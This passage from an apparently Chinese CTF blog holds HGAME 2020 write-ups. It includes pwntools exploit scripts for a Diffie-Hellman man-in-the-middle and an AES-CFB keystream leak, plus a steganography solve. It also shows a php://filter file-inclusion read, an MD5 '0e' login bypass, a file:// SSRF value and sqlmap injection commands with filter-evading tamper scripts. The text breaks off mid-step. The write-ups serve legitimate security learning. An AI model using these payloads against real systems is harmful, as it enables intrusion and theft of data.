<span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>enc_data<span class="token punctuation">,</span> IV<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h3><p>参考百度百科<a href="https://baike.baidu.com/item/Diffie-Hellman/9827194?fr=aladdin">Diffie-Hellman密钥交换算法</a></p>
<p>大概就是A与B之间进行一个密钥交换，自己充当C，在A与B交换公钥的时候，修改成自己的公钥，那么A与B通信时，经过C，C将A发来的数据，用自己的私钥解密后，再用B的公钥加密，发给B，B发数据时同理。那么A与B之间可以正常通信，并且没发现C的存在。那么C就可以窥探AB之间的通信内容</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
<span class="token keyword">import</span> gmpy2

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits

<span class="token keyword">def</span> <span class="token function">generateXXXX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a1 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        <span class="token keyword">for</span> a2 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
            <span class="token keyword">for</span> a3 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
                <span class="token keyword">for</span> a4 <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
                    <span class="token keyword">yield</span> <span class="token punctuation">(</span>a1<span class="token operator">+</span>a2<span class="token operator">+</span>a3<span class="token operator">+</span>a4<span class="token punctuation">)</span>


io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.98.192.231'</span><span class="token punctuation">,</span> <span class="token number">25258</span><span class="token punctuation">)</span>
tail <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">') =='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sha256(XXXX+'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">') =='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
_hexdigest <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'tail&#123;'</span> <span class="token operator">+</span> tail <span class="token operator">+</span> <span class="token string">'&#125;'</span>
<span class="token keyword">print</span> <span class="token string">'_hexdigest&#123;'</span> <span class="token operator">+</span> _hexdigest <span class="token operator">+</span> <span class="token string">'&#125;'</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span>  generateXXXX<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    h <span class="token operator">=</span> sha256<span class="token punctuation">(</span>x<span class="token operator">+</span>tail<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> h <span class="token operator">==</span> _hexdigest<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'XXXX&#123;'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'&#125;'</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'first.\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token comment"># get p g</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data
p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Alice: p = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'p=%d'</span> <span class="token operator">%</span> p

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data
g <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Alice: g = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'g=%d'</span> <span class="token operator">%</span> g

<span class="token comment"># 生成自己的公钥和私钥</span>
my_private_key <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
my_public_key <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> my_private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token comment"># replace A with my_public_key</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data
A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'[WARNING] : A = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'A=%d'</span> <span class="token operator">%</span> A

<span class="token comment"># 生成真正的解密和加密的密钥</span>
KA <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> my_private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span>  <span class="token comment"># 扮演B,与A通信</span>

<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'this message? (yes/no)\n>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number\n>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>my_public_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token comment"># replace B with my_public_key</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data
B <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'[WARNING] : B = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'B=%d'</span> <span class="token operator">%</span> B

KB <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>B<span class="token punctuation">,</span> my_private_key<span class="token punctuation">,</span> p<span class="token punctuation">)</span>  <span class="token comment"># 扮演A,与B通信</span>

<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'this message? (yes/no)\n>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number\n>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>my_public_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>


io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'same key?\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'encrypted flag!\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'`C_b = (m * S_b) % p`\n'</span><span class="token punctuation">)</span>

<span class="token comment"># get C_b</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data

C_b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'[WARNING] : C_b = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'C_b=%d'</span> <span class="token operator">%</span> C_b

<span class="token comment"># replace C_b </span>
raw_b <span class="token operator">=</span>  <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>KB<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">*</span> C_b<span class="token punctuation">)</span> <span class="token operator">%</span> p <span class="token comment"># 用KB解密</span>
encrypt_b <span class="token operator">=</span> <span class="token punctuation">(</span>raw_b <span class="token operator">*</span> KA<span class="token punctuation">)</span> <span class="token operator">%</span> p   <span class="token comment"># 用KA加密，发给A</span>

<span class="token keyword">print</span> <span class="token string">'raw_b=%d'</span> <span class="token operator">%</span> raw_b

<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'(yes/no)\n>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yes'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number\n>'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>encrypt_b<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># get C_a</span>
<span class="token keyword">print</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'I get the flag.\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
data <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">'&#123;%s&#125;'</span> <span class="token operator">%</span> data
C_a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Alice: C_a = '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
raw_a <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>KA<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">*</span> C_a<span class="token punctuation">)</span> <span class="token operator">%</span> p <span class="token comment"># 解密A发来的数据</span>


<span class="token comment"># print flag</span>

flag1 <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>raw_a<span class="token punctuation">)</span>
flag2 <span class="token operator">=</span> number<span class="token punctuation">.</span>long_to_bytes<span class="token punctuation">(</span>raw_b<span class="token punctuation">)</span>

<span class="token keyword">print</span> flag1<span class="token operator">+</span>flag2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h3><p>题目讲了，是AES的CFB加密模式，可以参考一下这篇文章：<a href="https://blog.csdn.net/chengqiuming/article/details/82355772">https://blog.csdn.net/chengqiuming/article/details/82355772</a></p>
<p>基本思路就是，任何数与零异或都是它本身。可以通过传入一整个分组0，从而解密的时候，得到的就是用来异或的密钥，flag一共三个分组，逐步获取每一个部分即可。</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python</span>
<span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sys <span class="token keyword">import</span> exit

<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c1<span class="token punctuation">,</span>c2 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_part</span><span class="token punctuation">(</span>now_flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.98.192.231'</span><span class="token punctuation">,</span> <span class="token number">25147</span><span class="token punctuation">)</span>
    count <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>now_flag<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">16</span> <span class="token comment"># 已经接出多少个分组</span>

    <span class="token comment"># get key</span>
    cipher <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'00'</span> <span class="token operator">*</span> <span class="token number">16</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'decrypt\n> '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        key <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span>
        cipher <span class="token operator">+=</span> xor<span class="token punctuation">(</span>key<span class="token punctuation">,</span> now_flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment"># 剩余的次数</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Here is your encrypted FLAG(hex): '</span><span class="token punctuation">)</span>
    enc_part <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>count<span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">:</span>count<span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> xor<span class="token punctuation">(</span>enc_part<span class="token punctuation">,</span> key<span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">+=</span> get_part<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="三重隐写"><a href="#三重隐写" class="headerlink" title="三重隐写"></a>三重隐写</h3><p>首先有三个音频：<code>Unlasting.mp3</code> 、<code>You know LSB.wav</code>、<code>上裏与手抄卷.mp3</code></p>
<p>第二个音频，从名字可以看出是LSB隐写，可以用slienteye工具获取隐写的信息：</p>
<p><img src="/images/e1de0fb/misc-1-1.png" alt="1"></p>
<p>然后用这个key，用Mp3Stego工具提取第三个音频里的信息：</p>
<p><code>decode -X -P  uFSARLVNwVIewCY5 上裏与手抄卷.mp3</code> </p>
<p>得到</p>
<p><img src="/images/e1de0fb/misc-1-3.png" alt="3"></p>
<p>然后用这个密码解出压缩包，用题目给的工具打开，需要密码，密码只能在第一个音频里了。</p>
<p>kali用foremost命令从这个音频里分离出一个图片，长这个样子：</p>
<p><img src="/images/e1de0fb/misc-1-4.png" alt="4"></p>
<p>出题人给了个hint：”你坐过飞机吗？“，巧了，没有。。。然后出题人说这也是一种码，那就可以扫咯（微信扫可以识别，但扫不出东西），经过百度发现，这个貌似叫pdf417码。找了好久的识别网站，终于找到一个可以识别<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx</a></p>
<p>识别如下：</p>
<p><img src="/images/e1de0fb/misc-1-2.png" alt="2"></p>
<p>得到解密密钥，解密出flag.txt文件，里面即flag</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本周必需得总结一下，学了比较多（但同时也摸了比较多鱼），这周只ak了pwn（也只能akpwn了）。</p>
<p>方向是pwn，总是先做出的题是web，这周也不例外。</p>
<p>啃了一大波heap的资料后，才开始陆续解出pwn题，pwn是真的爽！</p>
<p>Re一如既往地看着汇编蒙圈</p>
<p>起码这次Crypto不是套公式了，因为ToyCipher_XorShift这题主要还是位运算，还是比较好做的（而且还发现我对python的strip这个函数误解很深）</p>
<p>（misc脑洞好大<del>~</del>)</p>
]]></content>
      <categories>
        <category>hgame-2020</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame-week2-writeup</title>
    <url>/1966f4b8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>因为图片url要替换，这些工作量有点大，现在才弄好。请收下这份迟来的writeup</p>
<span id="more"></span>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><p>点击链接后跳转到url：<a href="http://cosmos-admin.hgame.day-day.work/?action=login.php">http://cosmos-admin.hgame.day-day.work/?action=login.php</a></p>
<p>多次测试这个action参数发现，有文件包含漏洞，利用php伪协议，读取login.php源码</p>
<pre class="line-numbers language-none"><code class="language-none">?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;login.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到数据base64解码写入文件查看：</p>
<p><img src="/images/1966f4b8/web-1-2.png" alt="2"></p>
<p>猜测这个DEBUG_MODE是true，那么访问login.php页面，传入参数</p>
<pre class="line-numbers language-none"><code class="language-none">?debug&#x3D;admin_username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以得到变量admin_username的内容为<code>Cosmos!</code>，依次可以得到admin_password的内容为<code>0e114902927253523756713132279690</code></p>
<p>且有：<img src="/images/1966f4b8/web-1-5.png" alt="5"></p>
<p>密码md5值是<code>0e</code>开头的，如果这个md5值和另一个<code>0e</code>开头的字符串用<code>==</code>比较，php会认为这两个字符串是浮点数的科学计数法，会转化成数字再比较，0的任何次幂都是0，那么只要找一个字符串的md5值同样是<code>0e</code>开头的就可以了，百度一个即可，登录后进入后台页面admin.php，同样先利用前面的文件包含漏洞读取admin.php的源码</p>
<p><img src="/images/1966f4b8/web-1-8.png" alt="8">)<img src="/images/1966f4b8/web-1-7.png" alt="7"></p>
<p>那么图片url构造为</p>
<pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;localhost&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>把结果base64解码即可</p>
<hr>
<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>url为<a href="http://139.199.182.61/index.php?id=1">http://139.199.182.61/index.php?id=1</a></p>
<p>这个id存在sql注入，经过测试，过滤了空格还有一些关键词如<code>select</code>，不过关键词的过滤是大小写区分的，而且只过滤了一次，所以可以大小写混合绕过或者双写绕过如：<code>seLect</code>或者<code>selselectect</code>。空格可以用注释替代比如：<code>and 1=1</code>可以换成<code>and/**/1=1</code></p>
<p>知道过滤了哪些之后，上sqlmap。</p>
<p>关键词过滤用大小写随机绕过脚本<code>randomcase.py</code>，空格替换成注释<code>space2comment.py</code></p>
<p>检测注入：</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后获取数据库名称：</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得知数据库名称为<code>easysql</code>，然后获取数据表：</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -D easysql -tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得知有一个表为<code>f1aggggggggggggg</code>，应该是存放了flag，dump出这个表：</p>
